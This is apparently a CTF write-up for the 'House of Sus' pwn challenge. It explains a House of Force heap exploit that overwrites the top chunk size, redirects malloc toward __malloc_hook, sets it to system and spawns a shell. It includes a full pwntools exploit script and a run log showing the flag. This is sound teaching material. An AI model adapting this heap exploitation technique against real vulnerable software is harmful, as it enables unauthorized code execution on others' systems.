
## Level: Easy

### Challenge
#### TL;DR

create a chunk and overwrite the wilderness with a very large number due to an overflow...

this will overlap the target address and resulting in read-what-where, which we can use it to overwrite malloc_hook with system to pop a shell... 
``` 
checksec ./house_of_sus
[*] '/home/4rsp/Downloads/sunshinectf/house_of_sus'
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        No PIE (0x3fe000)
    RUNPATH:    b'.'
    Stripped:   No
    Debuginfo:  Yes
```
> No PIE, Partial RELRO, debuginfo and not stripped...
> what more can you wish for from a binary 😅
  
![menu](https://github.com/user-attachments/assets/24c5f22c-227d-488b-9446-7efe84d7e67e)

> amongus... cool menu

Fortunately, we have free leaks on the main menu and option 2 (heap and libc)...

Also there is an overflow in option 3 so we can create a chunk then overwrite the wilderness (the top chunk's size) with a very large number (e.g. -1)

this will make sure that malloc won't use `mmap` for any further allocations because it will think the top chunk has always *enough* space..

and this will result in overlapping target address (read-what-where)...

Here is my approach with helpful heap snippets to improve visuality:


![newwilderness](https://github.com/user-attachments/assets/47fb63ae-68a5-46e8-b76c-bf89da5d1922)

> Use the overflow in option 3 to overwrite the wilderness with a very large number.

![overlapsize](https://github.com/user-attachments/assets/2cb9e4e7-8221-4398-a75d-f3bbffa74f19)

> Calculate the address of wilderness and the target from the leaks and allocate a chunk with size of target - top_addr - 0x10 # for metadata

![systemoverwrite](https://github.com/user-attachments/assets/f5518ba2-59f8-4808-99ed-6df30c7f0f5e)

> Overwrite malloc_hook pointer (the target address) with system

> > ... and finally call malloc with the address of "/bin/sh" in size to pop a shell

```
[+] Starting local process './house_of_sus_patched': pid 27582
HEAP LEAK: 0x2b3c1660
LIBC LEAK:0x7f75fc244390
malloc_hook: 0x7f75fc5ebc30
binsh: 0x7f75fc3b3d88
[*] Switching to interactive mode
sun{4Re_y0U_th3_!mP0st3r_v3rY_su55!}
/bin/sh: 2: 1: not found
$  
```

Calculating the offset for distances was quite painful until I get the hang of it...

You can read more about house of force in ![here](https://0x434b.dev/overview-of-glibc-heap-exploitation-techniques/#house-of-force) and ![there](https://book.hacktricks.xyz/binary-exploitation/libc-heap/house-of-force)

also check out c0nrad's ![video](https://youtu.be/qA6ajf7qZtQ?t=2277) on this challenge and offical (?) ![write-up](https://github.com/SunshineCTF/SunshineCTF-2023-Public/blob/main/Pwn/House_of_Sus/house_of_sus_exp.py) ...


here is my exploit code:

...enjoy

```python
#!/usr/bin/env python

from pwn import *
import time
"""
p = gdb.debug("./house_of_sus_patched", gdbscript='''
    c
''')
"""
p = process("./house_of_sus_patched")

def emergency_meeting(size, response, imposter):
    p.sendline(b"3")
    p.recvuntil(b"tasks >:(\n\n")
    p.sendline(str(size).encode('utf-8'))
    time.sleep(0.5)
    p.sendline(response)
    
    time.sleep(0.5)
    p.sendline(str(imposter).encode('utf-8'))

def do_task():
    p.sendline(b"1")

def report_body(imposter):
    p.sendline(b"2")
    p.recvuntil(b"the seed: ")
    libc_leak = int(p.recvline().strip())
    print("LIBC LEAK:" + hex(libc_leak))
    time.sleep(0.5)
    p.sendline(str(imposter).encode('utf-8'))
    return libc_leak

p.recvuntil(b"joining game: ")

heap_leak = int(p.recvline().strip(), 16)
print("HEAP LEAK: " + hex(heap_leak))

# libc leak thanks to seed in report_body option
p.recvuntil(b"emergency meeting\n\n")
libc_leak = report_body(1)

libc_base = libc_leak - 279440
malloc_hook = libc_base + 4111408
system = libc_base + 324640
binsh = libc_base + 1785224

print("malloc_hook: " + hex(malloc_hook))
print("binsh: " + hex(binsh))

# overwrite the wilderness with "-1"
# so it will overlap the target on the next malloc 
payload = b"A" * 40
payload += p64(0xFFFFFFFFFFFFFFFF)
p.recvuntil(b"emergency meeting\n\n")
emergency_meeting(40, payload, 1)

# calculate where the top chunk size (the wilderness) is 
heap_addr = heap_leak + 88 + 4112

# calculate the distance for malloc_hook
# allocate a chunk with a size of to the distance for malloc_hook
distance = malloc_hook - heap_addr - 0x10  # 0x10 for the metadata 
payload = b"B" * 8
p.recvuntil(b"emergency meeting\n\n")
emergency_meeting(distance, payload, 1)

# overwrite malloc_hook pointer with system
payload = p64(system)
payload += b"C" * 8
p.recvuntil(b"emergency meeting\n\n")
emergency_meeting(30, payload, 1)

# call malloc with "/bin/sh" in size
payload = b'cat flag'
binsh = int(binsh)
p.recvuntil(b"emergency meeting\n\n")
emergency_meeting(binsh, payload, 1)

p.interactive()
```

